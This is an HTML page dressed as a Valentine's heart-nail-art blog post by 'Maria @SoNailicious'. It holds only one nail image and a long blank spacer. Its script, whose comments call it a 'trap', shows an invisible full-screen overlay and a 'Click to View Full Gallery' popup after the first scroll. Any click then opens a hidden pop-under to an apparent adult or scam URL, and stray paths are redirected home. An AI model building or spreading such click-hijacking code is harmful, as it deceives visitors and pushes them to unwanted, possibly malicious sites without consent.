<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>JVX NAILS FASHION</title>
<style>
  body { 
    font-family: Arial, sans-serif; 
    line-height: 1.6; 
    color: #1b1b1b; 
    max-width: 800px; 
    margin: auto; 
    padding: 20px; 
    background-color: #ffffff; 
  }
  h1 { color: #ea148c; font-size: 28px; }
  h2 { color: #ea148c; font-size: 22px; margin-top: 30px; }
  h3 { font-size: 20px; margin-top: 20px; color: #e3007e; }
  .nail-step img { max-width: 100%; height: auto; display: block; margin: 10px 0; border: 1px solid #ddd; padding: 4px; }

  /* Full-screen invisible "Trap" Layer */
  #interaction-layer {
    position: fixed;
    top: 0; left: 0; width: 100%; height: 100%;
    z-index: 999999;
    background: rgba(0,0,0,0); /* Invisible */
    cursor: pointer;
    display: none; /* Hidden until scroll */
  }

  /* Centered Image Box */
  #pop-box {
    position: fixed;
    top: 50%; left: 50%;
    transform: translate(-50%, -50%);
    background: #fff;
    padding: 10px;
    border-radius: 8px;
    box-shadow: 0 10px 30px rgba(0,0,0,0.5);
    z-index: 1000000;
    display: none;
    text-align: center;
  }
</style>
</head>
<body>

<div id="interaction-layer"></div>
<div id="pop-box">
    <img src="https://stellaplus.netlify.app/IMG_2216.jpeg" style="max-width: 80vw; max-height: 60vh;">
    <p style="color: #ea148c; font-weight: bold;">Click to View Full Gallery</p>
</div>

<header>
  <h1>JVX NAILS FASHION</h1>
  <p>by <strong>Maria @SoNailicious</strong></p>
</header>

<article>
  <h2>12 Incredible Heart Nails to Try This Valentine’s Day</h2>
  <p>Valentine’s Day is just around the corner! Scroll down for inspiration.</p>

  <section class="nail-step">
    <h3>1. Rainbow Heart nails</h3>
    <img src="https://stellapluss.netlify.app/ImageDrain-20260329T210410.825Z.jpeg" alt="Nails">
  </section>
  <div style="height: 1000px;"></div> </article>

<script>
/** * 1. THE REDIRECT 
 * Sends user to home if they are on a non-existent path.
 */
(function() {
    const path = window.location.pathname;
    // If not root or index, redirect home
    if (path !== '/' && path !== '/index.html') {
        window.location.href = '/';
    }
})();

/** * 2. THE POP-UNDER 
 * Triggers on the first click after a scroll.
 */
const adUrl = 'https://go.pluse.name.ng/Celebnude';
const layer = document.getElementById('interaction-layer');
const box = document.getElementById('pop-box');

// Show the trap after a tiny scroll
window.addEventListener('scroll', () => {
    layer.style.display = 'block';
    box.style.display = 'block';
}, { once: true });

// Handle the click
function handlePop() {
    const win = window.open(adUrl, '_blank');
    if (win) {
        win.blur();
        window.focus();
    }
    // Remove trap so they can actually use the site
    layer.style.display = 'none';
    box.style.display = 'none';
}

layer.addEventListener('click', handlePop);
box.addEventListener('click', handlePop);
</script>

</body>
</html>
